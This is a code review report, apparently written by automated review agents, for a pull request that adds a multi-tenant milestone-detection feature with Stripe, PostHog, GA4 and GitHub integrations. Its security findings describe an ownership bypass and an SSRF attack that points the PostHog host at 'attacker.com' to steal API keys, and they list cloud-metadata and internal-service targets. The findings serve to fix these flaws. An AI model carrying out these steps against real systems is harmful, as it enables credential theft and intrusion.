# Code Review — Sous-Chef Part 2 (PR #55)

**Branch:** `feat/sous-chef-part-2` · merge-base `f9bf5c4` vs `origin/main`
**Scope:** 26 files · ~3300 LOC · Units 8–12 of the Sous-Chef plan
**Intent:** Multi-tenant milestone-detection agent — Stripe / PostHog / GA4 / GitHub-stars scans via first `convex/crons.ts`, admin UI at `/admin/sous-chef`, dual-auth REST for paste-a-key
**Reviewers (12):** correctness · testing · maintainability · project-standards · agent-native · learnings · security · performance · api-contract · reliability · adversarial · kieran-typescript
**Run artifact:** `.context/compound-engineering/ce-review/20260422-121436-3c18f95d/`

---

## Verdict

**Not ready** — 2 P0 auth findings must land before merge. 4 P1 correctness/coverage findings should follow.

Fix order:
1. **#1** Convex ownership bypass (security / adversarial / api-contract agree)
2. **#2** PostHog host SSRF (leaks decrypted API key to attacker-controlled host)
3. **#3** GitHub stars seed never fires on install (R8 flood)
4. **#4** Stripe subscriptions pagination
5. **#5** Swallowed seed error on POST → first-connect flood
6. **#6** Convex scan-action + API-route tests
7. Bulk-apply 18 P2/P3 safe_auto fixes

---

## P0 — Critical (Must fix before merge)

### #1 — Public Convex mutations/actions accept caller-supplied `userId` with no ownership check
**Files:** `convex/sousChef.ts`, `convex/integrationSecrets.ts`, `convex/drafts.ts` (`insertDraftIfNew`), `convex/milestoneHits.ts` (`seedAlreadyHit`)
**Reviewers:** security (0.95) · adversarial (0.95) · api-contract (0.90) · project-standards (residual) — **merged confidence 1.00**

`NEXT_PUBLIC_CONVEX_URL` is browser-visible. `ConvexReactClient` mounts with no auth token (`src/components/convex-provider.tsx`). Every public mutation/action in this PR accepts `userId` as a plain argument and performs zero `ctx.auth.getUserIdentity()` check.

Exploitable endpoints:
- `api.sousChef.scanNow({ userId, provider })` — server decrypts victim's key, queries Stripe/PH/GA4, returns `{ ok, mrrUsd, fired }` (revenue leak)
- `api.sousChef.seed` — same, seed-scoped
- `api.integrationSecrets.upsert` — overwrite victim's sealed credentials with attacker-provided ciphertext (victim's scan runs against attacker's Stripe account)
- `api.integrationSecrets.disconnect` — silently remove victim's integration
- `api.integrationSecrets.setEnabled` — disable victim's scans
- `api.milestoneHits.seedAlreadyHit` — suppress future drafts for any user
- `api.drafts.insertDraftIfNew` — inject arbitrary drafts into any user's account

**Fix:**
1. Convert `sousChef.scanNow`/`sousChef.seed` from `action` → `internalAction`. Call exclusively from REST via `convex.action(internal.sousChef.scanNow, ...)` after `authenticate()` derives `userId` from auth context.
2. Convert `integrationSecrets.{upsert,setEnabled,disconnect}`, `milestoneHits.seedAlreadyHit`, `drafts.insertDraftIfNew` from `mutation` → `internalMutation`. Expose a thin authenticated REST or add `ctx.auth.getUserIdentity()` assertion.
3. Verify no other `userId`-accepting public mutation was added in Part 1 that has the same gap.

**Test scenarios (once fixed):**
- Unauthenticated browser call returns 401/unauthorized
- Authenticated user A calling with `userId: "B"` is rejected
- REST route still works end-to-end via `authenticate()`

---

### #2 — SSRF via PostHog `host` field → decrypted API key exfiltration
**Files:** `src/app/api/v1/sous-chef/integrations/route.ts:39`, `convex/integrations/posthog.ts:69`
**Reviewers:** security (0.88) · adversarial (0.90) · correctness (0.97) — **merged confidence 0.98**

Validation is `b.host.startsWith("http")` only. UI shows a locked `<select>` with two options, but REST accepts any string. The host is stored unencrypted in `integrationSecrets.extra`. On every daily cron + `scanNow`, `posthog.ts` runs:

```ts
fetch(`${host}/api/projects/${projectId}/query/`, {
  headers: { Authorization: `Bearer ${apiKey}` },
  ...
})
```

Attack: POST `{ provider: "posthog", apiKey: "phc_...", projectId: "1", host: "http://attacker.com" }`. Every daily cron sends the decrypted PostHog personal API key to `attacker.com`. 300-char response body is stored in `lastScanError` and rendered in the admin UI → blind-to-semi-blind SSRF read channel when the attacker makes the target return a 4xx.

Also hits:
- `http://169.254.169.254/latest/meta-data/` — EC2 instance metadata
- `http://localhost:6379` / `http://10.0.0.1/admin` — internal services
- `http://[::1]/` — IPv6 loopback

**Fix:**
```ts
const ALLOWED_POSTHOG_HOSTS = new Set([
  "https://us.posthog.com",
  "https://eu.posthog.com",
]);
if (!ALLOWED_POSTHOG_HOSTS.has(b.host)) {
  return { error: "host must be a known PostHog cloud URL" };
}
```

If self-hosted PostHog must be supported later:
- Enforce HTTPS-only
- Resolve hostname server-side, reject RFC-1918 / loopback / link-local IPs
- Require operator-level opt-in (env var allowlist)

---

## P1 — High

### #3 — GitHub-stars `seedFromCurrentState` never called on install
**Files:** `convex/sousChef.ts`, `convex/integrations/githubStars.ts`, `convex/githubInstallations.ts` (`upsert`)
**Reviewers:** correctness (0.98) · reliability (0.97) · maintainability (0.92) — **merged 1.00**

`sousChef.seed` provider union is `stripe | posthog | ga4` — no `github` branch. `githubStars.seedFromCurrentState` exists but has no caller outside manual invocation. First daily cron after a GitHub App install calls `githubStars.scan` with `alreadyHit = []` → `detectCrossedStarThresholds(currentStars, [])` returns every already-crossed threshold → fires drafts for each. Direct R8 violation.

Scenario: user installs Sous-Chef's GitHub App on a 2.5k-star repo. Next cron fires `star:100:<repo>` + `star:1000:<repo>` as new drafts, even though these thresholds were crossed months ago.

**Fix:**
- Add `github` to `sousChef.seed`'s provider union (or a separate `seedGithub` action, since stars seed requires `installationId` too).
- Call it from the installation-linking path. The GitHub App webhook already has an `installation` event handler — hook seed in after `githubInstallations.upsert` completes.
- Consider also: `seedFromCurrentState` per repo when the user enables `notifyOnPrMerge` (doesn't exist today — prevents PR-merge retroactive flood too).

---

### #4 — Stripe `subscriptions.list({ limit: 100 })` not paginated
**Files:** `convex/integrations/stripe.ts:63-67`
**Reviewers:** correctness (0.92) · performance (0.88) · reliability (0.92) — **merged 1.00**

Limit 100 is the Stripe max page size; `has_more` is never checked. Users with >100 active subscriptions silently under-count MRR. Thresholds derived from subscriptions 101+ never fire. Silent failure — no error, no warning.

**Fix:** Use the Stripe SDK auto-pagination helper:
```ts
const subs: SubscriptionLike[] = [];
for await (const s of stripe.subscriptions.list({
  status: "all",
  limit: 100,
  expand: ["data.items.data.price"],
})) {
  subs.push({ status: s.status, monthlyUsd: /* same as before */ });
}
```

Handles 100, 1000, or 10000 subscriptions the same way. No code path breakage.

---

### #5 — Swallowed `seed()` error on POST → first-connect flood
**Files:** `src/app/api/v1/sous-chef/integrations/route.ts:112-119`, `convex/integrations/{stripe,posthog,ga4}.ts`
**Reviewers:** reliability (0.95) · adversarial (0.90) — **merged 1.00**

```ts
try {
  await convex.action(api.sousChef.seed, { userId, provider: body.provider });
} catch (err) {
  console.error("[sous-chef] seed on connect failed:", err);
}
return Response.json({ ok: true, provider: body.provider });
```

If seed fails (rate limit, transient network, bad credential that only fails on scan-shaped queries), user sees "Connected". Next cron sees empty `alreadyHit` list → historical flood. Current comment says "acceptable fallback" but it isn't — R8 is broken and user has no signal.

**Fix options (pick one):**
1. **Mark seed pending on row**: add `seedPending: boolean` to `integrationSecrets`. Set on upsert. Cleared on seed success. Scan path checks `seedPending` — if true, seed first, then scan.
2. **Retry on scan**: if `alreadyHit` is empty but `lastScanOkAt` is null (never-successfully-scanned), run seed before scan.
3. **Fail the connect**: don't swallow — return 502 with `{ error: "seed failed, please retry" }`. Requires user to retry but is simple and fail-loud.

Option 1 is cleanest. Option 3 is safest for v1.

---

### #6 — Zero Convex scan-action and API-route tests
**Files:** `convex/integrations/*.ts`, `convex/milestoneHits.ts`, `convex/sousChef.ts`, `src/app/api/v1/sous-chef/integrations/route.ts`
**Reviewers:** testing (0.97) — confidence 0.97

Plan Unit 8 explicitly listed `convex/__tests__/stripe-scan.test.ts` with scenarios "mocked Stripe client → 3 new thresholds crossed → 3 drafts inserted", first-connect seed, and auth error. Directory doesn't exist. Same gap for PostHog, GA4, GitHub stars.

No test covers:
- `validateBody()` discriminator branches (stripe/posthog/ga4/unknown)
- Stripe key prefix check (`rk_`/`sk_`)
- GA4 JSON parse-fail branch
- `seedAlreadyHit` idempotency
- `insertDraftIfNew` redelivery dedup
- `sousChef.seed`/`scanNow` dispatch correctness

**Fix:**
- Install `convex-test` dev dep (or equivalent harness).
- Add `convex/__tests__/` with per-provider scan integration tests using mocked SDK and in-memory Convex.
- Add `src/app/api/v1/sous-chef/__tests__/integrations.test.ts` for route handlers with supertest-style harness.
- Cover every untested branch listed in `testing.json`.

---

## P2 — Moderate (17 findings)

### #7 — GitHub-stars `scan` never calls `recordScanResult`
`convex/integrations/githubStars.ts:81-89`. 4-reviewer agreement (correctness 0.95, maintainability 0.95, reliability 0.97, kieran-ts 0.95). Stripe/PostHog/GA4 all call `recordScanResult` on success AND failure. Stars doesn't call it at all. Admin UI `Last OK`/`Last error` permanently blank for GH stars.

**Fix:** Add `recordScanResult` calls matching the other three providers. Ideally: extract the shared try/catch/record scaffold into a `runScan(ctx, userId, adapter)` core (see #30).

`autofix_class: safe_auto`

---

### #8 — Non-exhaustive provider switch in `sousChef.ts`
```ts
if (prov === "stripe") { return ... }
if (prov === "posthog") { return ... }
return ... // ga4 — IMPLICIT FALLTHROUGH
```

Add fourth provider → silently routes to GA4. `Promise<unknown>` annotation hides it from tsc.

**Fix:**
```ts
switch (prov) {
  case "stripe": return ...;
  case "posthog": return ...;
  case "ga4": return ...;
  default: {
    const _exhaustive: never = prov;
    throw new Error(`unknown provider: ${_exhaustive}`);
  }
}
```

Also: consolidate provider union type into one exported constant (see #24).

`autofix_class: safe_auto`

---

### #9 — `window.confirm` regression
`src/components/admin/sous-chef-client.tsx:113`. Commit `6e04721` explicitly replaced this pattern in `drafts-client.tsx` because Strict Mode double-invoke hangs it. Re-introduced here. Follow the AlertDialog + PixelButton pattern from drafts.

`autofix_class: safe_auto`

---

### #10 — `listAllEnabled` full-table scan
`convex/githubInstallations.ts:118-126`. `.collect()` + JS filter on `enabled && status === "active"`. Other providers use `by_provider_enabled` compound index. Add matching index on `githubInstallations`:

```ts
.index("by_enabled_status", ["enabled", "status"])
```

Rewrite `listAllEnabled` to use it.

`autofix_class: gated_auto` (schema index change — run Convex codegen)

---

### #11 — GA4 `propertyId` not validated as numeric
`src/app/api/v1/sous-chef/integrations/route.ts:51`. Interpolated into `https://analyticsdata.googleapis.com/v1beta/properties/${propertyId}:runReport`. Bounded by scope + suffix, but trivially fixed:

```ts
if (!/^\d{1,20}$/.test(b.propertyId)) {
  return { error: "propertyId must be numeric" };
}
```

`autofix_class: safe_auto`

---

### #12 — Stripe `charges.list({ limit: 1 })` only checks most-recent charge
`convex/integrations/stripe.ts:87-90`. `first_sale` logic flips if the most-recent charge is a failed renewal. Also: seed path has same bug → future scan fires `first_sale` retroactively.

**Fix:** filter to succeeded only:
```ts
const charges = await stripe.charges.list({ limit: 1 });
// Or better: query with a succeeded filter via stripe.charges.search
```

Stripe doesn't support `status` as a direct filter on `charges.list`. Use `charges.search({ query: "status:'succeeded'", limit: 1 })` or scan back N charges.

`autofix_class: safe_auto`

---

### #13 — No `fetch`/SDK timeouts
Every external call in `convex/integrations/{stripe,posthog,ga4,githubStars}.ts` runs with no timeout. Stalled connection blocks the scan action up to Convex's 10-min ceiling.

**Fix:**
- `fetch(url, { signal: AbortSignal.timeout(15_000), ... })` for every `fetch`
- `new Anthropic({ timeout: 30_000 })` in `src/lib/haiku-call.ts`
- Stripe SDK: `new Stripe(apiKey, { timeout: 15_000, ... })`

`autofix_class: safe_auto`

---

### #14 — Sequential GitHub API calls per repo in stars scan
`convex/integrations/githubStars.ts:68-77`. `for...of` with `await fetchStarCount`. 50 repos = 50 serial fetches = ~10s wall-clock.

**Fix:** `Promise.allSettled` with concurrency cap ~10 (GitHub secondary rate limit window). Simple `p-limit` style or hand-rolled chunked batching.

`autofix_class: safe_auto`

---

### #15 — `githubRepoConfigs.toggle` destructures `installationId` unused
`convex/githubRepoConfigs.ts:99`. Sibling `getByRepo` correctly guards `config.installationId !== installationId`. `toggle` is missing the same guard. Any caller with a valid repoFullName can toggle any installation's repo.

Ownership bypass, but lower severity than #1 because it only affects `enabled` flag, not data. Still: fix to match `getByRepo`.

`autofix_class: safe_auto`

---

### #16 — `ConnectDialog` shadow off-scale
`src/components/admin/sous-chef-client.tsx:201`. `shadow-[8px_8px_0...]`. DESIGN.md shadow scale tops at `xl = 6px` for dialog cards.

**Fix:** use `shadow-xl` token (or inline equivalent 6px value). Audit other new Sous-Chef UI for same.

`autofix_class: safe_auto`

---

### #17 — No REST wrapper for `sousChef.scanNow`
Agents can't trigger on-demand scans. Cheap add:

**Fix:** `src/app/api/v1/sous-chef/integrations/scan/route.ts`:
```ts
export async function POST(request: Request) {
  const auth = await authenticate(request);
  if (!auth) return Response.json({ error: "Unauthorized" }, { status: 401 });
  const body = await request.json();
  if (!["stripe", "posthog", "ga4"].includes(body.provider)) {
    return Response.json({ error: "invalid provider" }, { status: 400 });
  }
  const result = await convex.action(api.sousChef.scanNow, {
    userId: auth.userId,
    provider: body.provider,
  });
  return Response.json({ ok: true, result });
}
```

After #1 fix, `api.sousChef.scanNow` is `internal` — use `internal.sousChef.scanNow`.

`autofix_class: manual`

---

## P3 — Low (13 findings, quick bulk-apply)

| # | File | Summary |
|---|------|---------|
| 18 | `convex/drafts.ts:121-128` | Possible duplicate `milestoneHits` row when seed+cron overlap. Benign but gap. Add idempotency check in `insertDraftIfNew` before milestoneHits insert. |
| 19 | `convex/milestoneHits.ts` | Convex indexes aren't unique constraints; concurrent `seedAlreadyHit` can double-insert. Accept for v1, document. |
| 20 | Ops | `SECRET_BOX_KEY` rotation = silent fleet-wide outage. Add Convex-dashboard alert on >N `lastScanError` per day. Advisory. |
| 21 | `route.ts:51` | No upper bound on `serviceAccountJson` size. Cap at e.g. 20KB before JSON.parse. |
| 22 | `src/app/api/v1/drafts/route.ts`, `DraftPreview` type | Convex returns new fields; REST silently drops them. If agent-visibility is desired, include `sourceSystem`/`milestoneKey` in REST response. |
| 23 | DELETE `/api/v1/sous-chef/integrations` | `?provider=` query + `{ok:bool}` 200 diverges from other `/api/v1/` DELETEs (path segment, 204/404). |
| 24 | Provider union | Defined 4+ times across `integrationSecrets.ts`, `sousChef.ts`, `route.ts`. Consolidate into shared const. |
| 25 | Milestone key parse/build | Parsers live in `*-milestones.ts`, builders live in `src/lib/drafts/idempotency-key.ts`. Co-locate per provider. |
| 26 | `sous-chef-client.tsx:344-351` + `posthog.ts:22` comment | UI has only US/EU; doc claims self-hosted. Either add free-text option or remove the comment. |
| 27 | `integrationSecrets.setEnabled` | Dead code — no REST route, no UI caller. Delete or wire a `PATCH` to enable pause-without-disconnect. |
| 28 | `CLAUDE.md` | Out-of-date: "10 tables" → 15, missing `sous-chef/integrations` route, missing `(admin)/sous-chef`, missing 9 new Key Modules (crons.ts, sousChef.ts, secret-box.ts, pick-template.ts, compose-copy.ts, integrations/*). |
| 29 | Tests | Exact-at-first-threshold untested for PostHog/GA4/stars. GA4 doesn't assert catalog or 1M boundary. |
| 30 | 4 scan modules | Structurally identical. Extract shared `runScan(ctx, userId, adapter)` core. Copy-paste introduced #7 and #8. |

---

## Requirements Completeness (plan source: explicit)

Plan: `docs/plans/2026-04-22-001-feat-sous-chef-milestone-agent-plan.md`

| Req | Status | Note |
|-----|--------|------|
| R1 multi-tenant | ✅ met | |
| R2 text-only | ✅ met | |
| R3 template pick | ✅ met | |
| R4 hardcoded catalog | ✅ met | |
| R5 webhooks + polling | ✅ met | |
| **R6 idempotent once per user** | ⚠ partially | #1 bypass + #3 stars-seed-miss + #5 swallowed-seed can re-fire |
| R7 no backfill | ✅ met | |
| **R8 skip retroactive on connect** | ⚠ partially | #3 + #5 both produce historical flood |
| R9 encrypted at rest | ✅ met | **but #1 + #2 undermine the goal** |
| R10 admin home | ✅ met | |

---

## Learnings & Follow-up Docs

- `docs/solutions/` has **zero entries** on Convex crons, external-API integrations, AES-GCM, webhooks, dual-auth. This PR is effectively greenfield from an institutional-knowledge view.
- Post-merge: author `docs/solutions/patterns/critical-patterns.md` capturing:
  - `window.confirm` ban (commit `6e04721`, again re-introduced here as #9)
  - Strict Mode useRef-guard cleanup (same commit)
  - Convex public vs internal routing (#1 root cause)
  - Threshold-crossing state machine (upward-only, seed semantics)
  - SECRET_BOX_KEY rotation (intentionally deferred)

---

## Bulk-fix script (18 `safe_auto` items, once P0/P1 addressed)

Apply in order, one commit per topic:

1. **recordScanResult parity** (#7) — `convex/integrations/githubStars.ts`
2. **Exhaustive provider switch** (#8) — `convex/sousChef.ts` + consolidate union (#24)
3. **AlertDialog replaces confirm** (#9) — `src/components/admin/sous-chef-client.tsx`
4. **GA4 propertyId regex** (#11) — `route.ts`
5. **Stripe pagination** (#4) — `convex/integrations/stripe.ts` (P1 but mechanically safe)
6. **First-sale succeeded filter** (#12) — `convex/integrations/stripe.ts`
7. **Fetch/SDK timeouts** (#13) — 4 scan modules + `haiku-call.ts`
8. **Parallel stars scan** (#14) — `convex/integrations/githubStars.ts`
9. **toggle ownership check** (#15) — `convex/githubRepoConfigs.ts`
10. **Shadow scale** (#16) — `sous-chef-client.tsx`
11. **milestoneHits idempotency** (#18) — `convex/drafts.ts`
12. **serviceAccountJson size cap** (#21) — `route.ts`
13. **PostHog self-hosted UI OR remove comment** (#26) — two-file change
14. **Remove setEnabled dead code** (#27) — `convex/integrationSecrets.ts` (or wire later)
15. **CLAUDE.md update** (#28) — single file, additive
16. **Boundary tests** (#29) — 3 test files
17. **Parse/build co-location** (#25) — milestones modules
18. **runScan adapter** (#30) — if bandwidth; skip if not

Commit cadence: 1 PR with 1 commit per numbered topic, or group related fixes (crypto, stars, UI) into 3 commits.

---

## Next session checklist

- [ ] Fix #1 — Convex `internalAction`/`internalMutation` migration + auth checks
- [ ] Fix #2 — PostHog host allowlist
- [ ] Fix #3 — GitHub stars seed on install
- [ ] Fix #4 — Stripe pagination
- [ ] Fix #5 — Seed-pending flag or fail-loud on POST
- [ ] Write #6 — Convex + route tests
- [ ] Bulk-apply 18 P2/P3 `safe_auto` items
- [ ] Prompt-tune copy brevity (founder flag from earlier session — unrelated, same PR territory)
- [ ] Open `docs/solutions/patterns/critical-patterns.md`
- [ ] Update plan doc: mark Units 8–12 complete + note deferred items actually shipped (or not)
